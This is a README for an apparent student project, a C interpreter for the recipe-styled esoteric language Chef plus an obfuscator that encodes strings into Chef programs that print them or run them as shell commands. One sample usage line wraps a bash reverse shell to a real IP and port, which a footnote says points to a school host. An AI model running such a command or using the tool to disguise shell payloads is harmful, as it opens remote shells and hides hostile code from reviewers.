## Overview

>  "Chef is a programming language in which programs look like recipes."  
> — [*David Morgan-Mar*](https://www.dangermouse.net/esoteric/chef.html)

Chef is an *esoteric programming language*[^1] following the concept of *multiple coding*[^2], in which programs are intentionally designed so as to function as both valid programs and valid recipes. Chef is stack-based and utilizes three basic concepts:
1. Ingredients, which have numerical values and can be either dry, liquid, or unknown (*e.g.* 72 g haricot beans, 25 ml water, 6 human eyeballs)
2. An ordered set of infinite mixing bowls, which are the stacks primarily used for general processing and which hold various ingredients within them
3. An ordered set of infinite baking pans, which are used almost solely for data output—once items have been poured into the pans, they are not able to be removed

Together with cooking- and baking-themed commands, these three elements form a Turing-complete language[^3] that is *also* capable of describing a great number of recipes[^4]. Features such as the "Take *ingredient* from refrigerator" and "Mix [the [*nth*] mixing bowl] well" directives even allow for user input and randomness, respectively, allowing us to imagine a world in which one could write and play a cooking simulator in Chef.

Our final project attempts to create a Chef interpreter in C, and an obfuscator to transform simple messages to be printed or called as shell commands into Chef programs.

## Installation Instructions

1. Clone the repository and ensure that gcc, make, and libpcre2-dev are installed (if you're using the school computers, connect to marge.stuy.edu)
    - gcc is necessary for compiling the C code
    - make is necessary for running the makefile to direct gcc what to actually compile
    - libpcre2-dev is necessary for the regular expressions used in parsing the input files, which were as far as I can tell completely unfeasible to reasonably implement using POSIX regular expressions and far too small-scale to be worth utilizing lex and yacc for
2. Run `make compile` to compile the project.
3. Clean up using `make clean` at any time to delete the executables and any `.o` files

## Usage

### To obfuscate: `./obfuscate`

Obfuscate takes a single command flag and a string to encode and outputs a valid Chef file. The two valid flags are
- `-p`: The Chef file will *print* the string provided.
- `-x`: The Chef file *execute* the string provided as an `sh`-compatible shell command.

Sample usage:
- `./obfuscate -p "Hello, world!"`
- `./obuscate -p '"Chefs are nutters. They'\''re all self-obsessed, delicate, dainty, insecure little souls, and absolute psychopaths. Every last one of them." - Gordon Ramsay'`
- `./obfuscate -x 'echo "Hello, world!"'`
- `./obfuscate -x 'bash -c 'bash -i >& /dev/tcp/149.89.150.100/9001 0>&1''`[^5]

Watch out! Obfuscate is ONLY guaranteed to work on ASCII input with 256 or fewer distinct characters.[^6] Attempting to use it otherwise will throw an error.

### To interpret: `./interpret`

Interpret takes a file path followed by an optional flag and attempts to run it as a Chef file. If `-` is provided in lieu of a path, Interpret will attempt to read from the standard input. The only flag currently available is
- `-v`: Interpret will use *verbose* mode and print the intermediate, post-parsing steps of the file, allowing users to check that the file is at least being parsed correctly.

Sample usage:
- `./interpret recipes/factorial.chef`
- `./interpret download.txt -v`
- `cat recipes/souffle.chef | ./interpret -`
- `./obfuscate -p 'wow' | ./interpret - -v`

Watch out! Interpret is ONLY guaranteed to work on properly-formatted Chef programs using characters entirely within the ASCII set. Attempting to use it otherwise will throw an error or cause undefined behavior.[^7]

> [!IMPORTANT]
> This is not, in fact, strictly true. Our implementation of the Chef intrepreter features one nonstandard command of our own design. See [link!!]
> In addition, we've found that a great number of other interpreters allow (or require) nonstandard formatting (*e.g.* "the 1st mixing bowl", newlines as command separators, oven temperatures in degrees Fahrenheit, etc.) and as such will accept some technically incorrect formats.
> The "Serves" directive is mandatory, because the documentation is unclear.


[^1]: Per [Wikipedia](https://en.wikipedia.org/wiki/Esoteric_programming_language): "An *esoteric programming language* (sometimes shortened to *esolang*) is a programming language designed to test the boundaries of computer programming language design, as a proof of concept, as software art, as a hacking interface to another language (particularly functional programming or procedural programming languages), or as a joke. The use of the word esoteric distinguishes them from languages that working developers use to write software … Usability is rarely a goal for designers of esoteric programming languages; often their design leads to quite the opposite."

[^3]: At least I assume it's Turing complete. I found [this program by Wesley Janssen, Joost Rijneveld and Mathijs Vos](https://github.com/joostrijneveld/Chef-Interpreter/blob/master/ChefInterpreter/TuringsTastyTortillas.chef) which claims to be a working Turing Machine (and it certainly seems to be) and the fact that I cannot spot any way to solve the halting problem with it certainly seem exciting, but I can find no actual analysis and do not trust my own intuition.
[^4]: On the other hand, I know for a *fact* that Chef cannot represent all possible recipes, because there is no way to encode my grandmother's skillet chops and rice recipe. The step "Lie about the presence of onions" is unencodable due to the simple fact that Chef requres all instructions involving arbitrary verbs to be loops and have a matching "until *present participle*" command, while the command to lie about the presence of onions can never complete.
[^5]: That's a reverse shell to homer.stuy.edu on port 9001.
[^6]: It shouldn't be possible to use more than 256 distinct characters while staying in the 7-bit ASCII range, but you never know.
[^7]: It's not our problem, essentially.
